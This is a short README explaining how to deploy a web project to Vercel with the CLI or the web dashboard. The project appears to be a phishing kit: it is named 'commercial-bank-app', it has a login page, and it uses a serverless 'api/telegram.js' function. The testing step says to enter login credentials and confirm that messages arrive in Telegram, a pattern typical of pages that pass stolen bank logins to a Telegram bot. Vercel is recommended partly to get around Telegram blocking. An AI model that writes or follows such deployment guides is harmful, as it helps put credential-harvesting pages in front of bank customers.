# How to Deploy to Vercel (Free Cloud Hosting)

## Step 1: Create Vercel Account

1. Go to: https://vercel.com
2. Click "Sign Up" (use GitHub, Google, or email)
3. It's completely FREE!

## Step 2: Install Vercel CLI (Optional but Recommended)

1. Open terminal/command prompt
2. Run: `npm install -g vercel`
   - (If you don't have npm, install Node.js from nodejs.org first)

## Step 3: Deploy Your Website

### Method A: Using Vercel CLI (Easiest)

1. Open terminal in your project folder:
   ```
   cd "C:\Users\malik\Downloads\wetransfer_shmavyk_2025-10-23_0814"
   ```

2. Run:
   ```
   vercel
   ```

3. Follow the prompts:
   - Login to Vercel (if not logged in)
   - Press Enter to confirm project settings
   - Press Enter to confirm deployment

4. Done! You'll get a URL like: `https://your-project.vercel.app`

### Method B: Using Vercel Website (No CLI needed)

1. Go to: https://vercel.com/new
2. Click "Import Git Repository" OR "Deploy from local"
3. If using Git:
   - Push your code to GitHub
   - Connect GitHub to Vercel
   - Select your repository
   - Click "Deploy"
4. If deploying from local:
   - Drag and drop your project folder
   - Or use the Vercel CLI

## Step 4: Update Your Website URL

After deployment, you'll get a URL like:
- `https://commercial-bank-app.vercel.app`

**Important:** The Telegram proxy will automatically work because Vercel servers are in countries where Telegram isn't blocked!

## Step 5: Test

1. Open your Vercel URL: `https://your-project.vercel.app/splash.html`
2. Test login with credentials
3. Check your Telegram - messages should arrive! ✅

## Files Created for Vercel

- `vercel.json` - Vercel configuration
- `api/telegram.js` - Serverless function for Telegram
- `package.json` - Node.js package file

## Troubleshooting

- If deployment fails, make sure all files are in the project folder
- Check that `api/telegram.js` exists
- Make sure `vercel.json` is in the root folder

## Benefits

✅ Free hosting
✅ Telegram will work (servers in unblocked countries)
✅ Automatic HTTPS
✅ Fast global CDN
✅ No server management needed

## After Deployment

Your website will be live at: `https://your-project.vercel.app`

Users can access it from anywhere, and Telegram integration will work!

